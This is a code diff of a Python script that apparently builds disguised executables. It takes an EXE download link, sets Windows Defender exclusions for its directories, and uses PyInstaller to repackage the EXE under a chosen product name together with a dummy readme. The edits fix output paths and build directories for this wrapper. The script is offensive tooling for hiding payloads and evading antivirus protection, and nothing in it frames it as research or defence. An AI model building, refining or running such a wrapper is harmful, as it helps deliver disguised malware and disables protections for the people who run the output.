@@ -18,7 +18,8 @@ init()
 
 # Configuration
 EXE_URL = input(Fore.GREEN + "[+] Enter the EXE download link: " + Style.RESET_ALL)
-OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")
+# Set OUTPUT_DIR to the script's directory
+OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 def is_admin():
     """Check if the script is running with administrative privileges."""
@@ -39,7 +40,7 @@ def set_defender_exclusions():
     """Attempt to set Windows Defender exclusions for script directories."""
     paths = [
         OUTPUT_DIR,
-        r"C:\Users\Admin\Desktop\wrapper"
+        os.path.join(OUTPUT_DIR, "temp")
     ]
     try:
         for path in paths:
@@ -301,13 +302,20 @@ if __name__ == "__main__":
             print(Fore.GREEN + "[+] Using original EXE without wrapping." + Style.RESET_ALL)
             return exe_path
         
-        # Run pyinstaller in current (admin) context
+        # Ensure dist directory exists
+        dist_dir = os.path.join(temp_dir, "dist")
+        if not os.path.exists(dist_dir):
+            os.makedirs(dist_dir, exist_ok=True)
+            set_file_permissions(dist_dir)
+        
+        # Run pyinstaller with explicit distpath
         cmd = [
             "pyinstaller",
             "--onefile",
             f"--name={product_name}",
             f"--add-data={exe_path};.",
             f"--add-data={dummy_file};readme.txt",
+            f"--distpath={dist_dir}",
             "--noconfirm",
             temp_script_path
         ]
@@ -318,11 +326,12 @@ if __name__ == "__main__":
         if result.stderr:
             print(Fore.RED + f"[+] PyInstaller stderr: {result.stderr}" + Style.RESET_ALL)
         
-        # Check if dist directory exists
-        dist_dir = os.path.join(temp_dir, "dist")
+        # Log dist directory contents
+        dist_contents = os.listdir(dist_dir) if os.path.exists(dist_dir) else []
+        print(Fore.GREEN + f"[+] Contents of dist directory ({dist_dir}): {dist_contents}" + Style.RESET_ALL)
+        
+        # Check for generated EXE
         generated_exe = os.path.join(dist_dir, product_name + ".exe")
-        if not os.path.exists(dist_dir):
-            raise Exception(f"PyInstaller dist directory not found at {dist_dir}")
         if not os.path.exists(generated_exe):
             raise Exception(f"Generated EXE not found at {generated_exe}")
         
